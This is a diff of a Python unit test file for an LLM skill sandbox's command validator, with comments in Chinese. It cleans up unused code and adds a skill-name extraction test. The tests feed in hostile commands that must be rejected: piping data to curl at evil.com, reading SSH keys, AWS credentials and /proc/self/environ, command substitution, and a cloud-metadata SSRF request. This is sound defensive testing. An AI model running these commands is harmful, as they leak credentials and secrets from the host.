@@ -15,15 +15,12 @@
 """
 from __future__ import annotations
 
-import os
 from types import SimpleNamespace
 
 import pytest
 
-from apps.opspilot.services.skill_executor.path_rewriting_backend import (
-    PathRewritingBackend as _PathRewritingBackend,
-)
-
+from apps.opspilot.services.skill_executor.path_rewriting_backend import PathRewritingBackend as _PathRewritingBackend
+from apps.opspilot.services.skill_executor.path_rewriting_backend import extract_skill_names_from_text
 
 pytestmark = pytest.mark.unit
 
@@ -47,9 +44,8 @@ def _make_self(Cls) -> SimpleNamespace:
 
 def _validate(Cls, command: str) -> None:
     """模拟 deepagents 调用:重写 + 校验。"""
-    from apps.opspilot.services.skill_executor.path_rewriting_backend import (
-        rewrite_sandbox_paths,
-    )
+    from apps.opspilot.services.skill_executor.path_rewriting_backend import rewrite_sandbox_paths
+
     # 任意 sandbox 路径,_validate_command 内部不读 self._sandbox_dir /
     # self._skills_root(只查 _ALLOWED_COMMANDS / _BLOCKED_PATTERNS)
     rewritten = rewrite_sandbox_paths(command, "/tmp/sandbox", "/tmp/skills")
@@ -64,14 +60,12 @@ def _validate(Cls, command: str) -> None:
 
 def test_curl_command_blocked(tmp_path, PathRewritingBackend):
     """curl 不在白名单,直接被首 token 检查拦下。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="curl"):
         _validate(PathRewritingBackend, "curl https://example.com/")
 
 
 def test_wget_command_blocked(tmp_path, PathRewritingBackend):
     """wget 同上。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="wget"):
         _validate(PathRewritingBackend, "wget https://example.com/file.txt")
 
@@ -79,7 +73,6 @@ def test_wget_command_blocked(tmp_path, PathRewritingBackend):
 def test_curl_pipe_blocked_by_blacklist(tmp_path, PathRewritingBackend):
     """`cat|curl` / `cat|wget` 类管道也被 _BLOCKED_PATTERNS 拦(防止 LLM 用
     白名单命令当管道前缀绕开)。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\\\\bcurl\\\\b|\\\\bwget\\\\b"):
         _validate(PathRewritingBackend, "cat /tmp/x | curl https://evil.com/")
 
@@ -87,7 +80,6 @@ def test_curl_pipe_blocked_by_blacklist(tmp_path, PathRewritingBackend):
 def test_curl_in_command_args_blocked(tmp_path, PathRewritingBackend):
     """Python 调 urllib 的间接绕道不被 `\\bcurl\\b` 黑名单命中(没字面 curl),
     但 SSRFValidator 兜底会拦截云元数据 URL — 双层防御任意一层兜住。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="网络目标被 SSRF 拦截"):
         _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')\"")
 
@@ -95,7 +87,6 @@ def test_curl_in_command_args_blocked(tmp_path, PathRewritingBackend):
 def test_ssrf_169_metadata_blocked(tmp_path, PathRewritingBackend):
     """SSRFValidator 兜底:云元数据 169.254.169.254 直接拒(validate_llm_endpoint 模式
     也只挡云元数据,内网/127.x/localhost 全放)。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="网络目标被 SSRF 拦截"):
         _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')\"")
 
@@ -103,7 +94,6 @@ def test_ssrf_169_metadata_blocked(tmp_path, PathRewritingBackend):
 def test_ssrf_localhost_allowed(tmp_path, PathRewritingBackend):
     """LLM 端点宽松模式:127.0.0.1 / localhost / 内网放行(走系统白名单管控)。
     skill 沙箱要调本地 k8s API / 内部服务,所以默认放内网。"""
-    backend = _make_self(PathRewritingBackend)
     # 不抛 — 内网地址在 LLM 端点模式下被允许
     _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://localhost:8080/')\"")
     _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://127.0.0.1:32955/')\"")
@@ -111,7 +101,6 @@ def test_ssrf_localhost_allowed(tmp_path, PathRewritingBackend):
 
 def test_ssrf_private_10_allowed(tmp_path, PathRewritingBackend):
     """LLM 端点宽松模式:10.x / 172.16.x / 192.168.x 放行(企业内网常见)。"""
-    backend = _make_self(PathRewritingBackend)
     # 用 SSRF 不会拒的内网地址(走白名单命令 wget 不会触发黑名单字面拦)
     _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://10.0.0.1/api')\"")
 
@@ -123,49 +112,42 @@ def test_ssrf_private_10_allowed(tmp_path, PathRewritingBackend):
 
 def test_tilde_expansion_blocked(tmp_path, PathRewritingBackend):
     """`~/.ssh/id_rsa` 等隐藏文件路径被 _BLOCKED_PATTERNS 拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"~"):
         _validate(PathRewritingBackend, "cat ~/.ssh/id_rsa")
 
 
 def test_tilde_only_blocked(tmp_path, PathRewritingBackend):
     """`~/path` 形式(`~` 后跟 `/` 再跟任意字符)也算"展开",一拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"~"):
         _validate(PathRewritingBackend, "cat ~/secrets")
 
 
 def test_dollar_home_blocked(tmp_path, PathRewritingBackend):
     """`$HOME` 环境变量展开被拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\$HOME"):
         _validate(PathRewritingBackend, "cat $HOME/.aws/credentials")
 
 
 def test_dollar_brace_blocked(tmp_path, PathRewritingBackend):
     """`${HOME}` / `${PATH}` 形式被拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\$\{"):
         _validate(PathRewritingBackend, "cat ${HOME}/.ssh/id_rsa")
 
 
 def test_dollar_var_blocked(tmp_path, PathRewritingBackend):
     """`$PATH` / `$SECRET` / `$USER` 等无大括号形式被拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\$[A-Z_]"):
         _validate(PathRewritingBackend, "cat $PATH/etc/passwd")
 
 
 def test_dollar_paren_blocked(tmp_path, PathRewritingBackend):
     """`$(...)` 命令替换被拦(防止 `cat $(echo /etc/passwd)` 绕开)。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\$\("):
         _validate(PathRewritingBackend, "cat $(echo /etc/passwd)")
 
 
 def test_backtick_blocked(tmp_path, PathRewritingBackend):
     """反引号命令替换被拦(防止 `` cat `echo /etc/passwd` `` 绕开)。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"`"):
         _validate(PathRewritingBackend, "cat `echo /etc/passwd`")
 
@@ -177,14 +159,12 @@ def test_backtick_blocked(tmp_path, PathRewritingBackend):
 
 def test_proc_self_environ_blocked(tmp_path, PathRewritingBackend):
     """`/proc/self/environ` 读 host 进程 environ(拿 SECRET_KEY/DB_PASSWORD)拒。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
         _validate(PathRewritingBackend, "cat /proc/self/environ")
 
 
 def test_proc_cpuinfo_blocked(tmp_path, PathRewritingBackend):
     """`/proc/cpuinfo` / `/proc/meminfo` 等整 /proc 前缀都拒。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
         _validate(PathRewritingBackend, "cat /proc/cpuinfo")
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
@@ -193,14 +173,12 @@ def test_proc_cpuinfo_blocked(tmp_path, PathRewritingBackend):
 
 def test_dev_fd_blocked(tmp_path, PathRewritingBackend):
     """`/dev/fd/N` 反推进程打开文件,拒。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
         _validate(PathRewritingBackend, "cat /dev/fd/0")
 
 
 def test_dev_shm_blocked(tmp_path, PathRewritingBackend):
     """`/dev/shm/...` 跨进程共享内存,拒。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
         _validate(PathRewritingBackend, "cat /dev/shm/secret")
 
@@ -212,7 +190,6 @@ def test_dev_shm_blocked(tmp_path, PathRewritingBackend):
 
 def test_normal_commands_still_allowed(tmp_path, PathRewritingBackend):
     """核心白名单命令 + 沙箱内路径仍放行(防止修过头误伤正常用法)。"""
-    backend = _make_self(PathRewritingBackend)
     # 应不抛
     _validate(PathRewritingBackend, "ls /skills/foo")
     _validate(PathRewritingBackend, "cat /tmp/x")
@@ -226,9 +203,15 @@ def test_https_external_url_via_python_still_validated(tmp_path, PathRewritingBa
     """公网 URL 不会触发 SSRF 拦截(但仍被 _BLOCKED_PATTERNS 拦 curl/wget 字面)。
     注意:外网 https URL 通过 `python3 -c` 调 urllib 仍要过 SSRFValidator,
     公网不在黑名单网段,应放行。"""
-    backend = _make_self(PathRewritingBackend)
     # 不抛 — 公网 URL 通过 SSRF
     _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('https://api.github.com/')\"")
+
+
+def test_extract_skill_names_from_text():
+    assert extract_skill_names_from_text("/skills/kubernetes-specialist/SKILL.md") == ["kubernetes-specialist"]
+    assert extract_skill_names_from_text("python3 /skills/pdf/create_pdf.py") == ["pdf"]
+    assert extract_skill_names_from_text("echo hello") == []
+    assert extract_skill_names_from_text("cat /skills/a/x /skills/b/y /skills/a/z") == ["a", "b"]
 
 
 # =========================================================================
